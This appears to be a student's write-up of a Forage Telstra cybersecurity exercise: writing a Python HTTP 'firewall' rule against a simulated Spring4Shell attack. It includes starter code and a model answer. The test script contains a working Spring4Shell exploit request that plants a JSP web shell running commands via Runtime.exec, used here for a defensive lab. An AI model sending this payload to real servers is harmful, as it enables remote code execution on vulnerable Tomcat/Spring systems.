# (Technical) Mitigate the malware attack
Using the patterns you’ve identified, use Python to write a firewall rule to technically mitigate the malware from spreading.

## Here is the background information on your task

Work with the networks team to implement a firewall rule using the Python scripting language. Python is a common scripting language used across both offensive and defensive information security tasks.

In this task, we will simulate the firewall’s scripting language by using an HTTP Server. You can assume this HTTP Server has no computational requirements and has the sole purpose of filtering incoming traffic.

In the starter codebase, you will find a test script that you can use to simulate the malicious requests to the server.

You can check out the Readme file in the starter codebase for more information on how to get started.

## Here is your task

Use Python to develop a firewall rule to mitigate the attack. Develop this rule in `firewall_server.py` and only upload this file back here.

You may use `test_requests.py` to test your code whilst the firewall HTTP server is running.


## Documentation

https://docs.python.org/3/library/http.server.html

## code base


# Forage - Telstra Cyber Task 3


## Introduction


The purpose of this repo is to simulate a firewall server handling a malicious event for [Forage's](https://www.theforage.com) Telstra Cyber virtual experience program.


## Requirements


* Python 3+


## Get Started


The base HTTPServer is available in `firewall_server.py`. To start the server:


```python
python firewall_server.py
```


You can visit http://localhost:8000 in your browser and assert the console output for the server displays the response.


After you have written your firewall rule, you can test your code by running:


```python
python test_requests.py
```


This will make 5 test requests to `localhost:8000`, simulating the malware attack.


## Resources


HTTPServer: https://docs.python.org/3/library/http.server.html

## firewall_server.py
```
# www.theforage.com - Telstra Cyber Task 3
# Firewall Server Handler


from http.server import BaseHTTPRequestHandler, HTTPServer


host = "localhost"
port = 8000


#########
# Handle the response here 
def block_request(self):
    print("Blocking request")


def handle_request(self):
    self.send_response(200)
    self.send_header("content-type", "application/json")
    self.end_headers()


#########




class ServerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        handle_request(self)


    def do_POST(self):
        handle_request(self)


if __name__ == "__main__":        
    server = HTTPServer((host, port), ServerHandler)
    print("[+] Firewall Server")
    print("[+] HTTP Web Server running on: %s:%s" % (host, port))


    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass


    server.server_close()
    print("[+] Server terminated. Exiting...")
    exit(0)
```

## test_requests.py
```
# www.theforage.com - Telstra Cyber Task 3
# Test Requester


import http.client


host = "localhost"
port = 8000


def main():
    target = "%s:%s" % (host, port)
    print("[+] Beginning test requests to: %s" % target)
    successful_responses = 0


    for x in range (0,5):
        payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        print("[%s/5]: Making test request to %s with payload: %s" % (x + 1, target, payload))
        conn = http.client.HTTPConnection(target)


        conn.request('POST', '/tomcatwar.jsp', payload,  {
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded",
        })
        response = conn.getresponse()
        status_code = response.status
        if status_code == 200:
            successful_responses += 1
        print("Response status code: %s" % status_code)
        print("=============")


    print("[+] Test completed.")
    print("[+] Successful responses: %s/5" % successful_responses)


if __name__ == "__main__":
    main()
```

## My firewall_server.py file

[my answer firewall_server.py](firewall_server-my-answer.py)

## The answer

```
# www.theforage.com - Telstra Cyber Task 3
# Model Work Example
# Firewall Server Handler

from http.server import BaseHTTPRequestHandler, HTTPServer

host = "localhost"
port = 8000

def block_request(self):
    self.send_error(403, "Request blocked due to firewall")

def handle_request(self):
    # List of bad headers from the proof of concept payload
    bad_headers = {
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    bad_header_keys = bad_headers.keys()

    # If a request is on the Spring Framework path
    if self.path == "/tomcatwar.jsp":
        # Iterate through bad headers
        for bad_header_key in bad_header_keys:
            # If we find a bad header that matches the malicious payload
            if bad_header_key in self.headers and self.headers[bad_header_key] == bad_headers[bad_header_key]:
                # Block request and throw 403 error
                return block_request(self)

    # Return successful response
    self.send_response(200)
    self.send_header("content-type", "application/json")
    self.end_headers()

    self.wfile.write({ "success": True })

class ServerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        handle_request(self)

    def do_POST(self):
        handle_request(self)


if __name__ == "__main__":        
    server = HTTPServer((host, port), ServerHandler)
    print("[+] Firewall Server")
    print("[+] HTTP Web Server running on: %s:%s" % (host, port))

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass

    server.server_close()
    print("[+] Server terminated. Exiting...")
    exit(0)
```



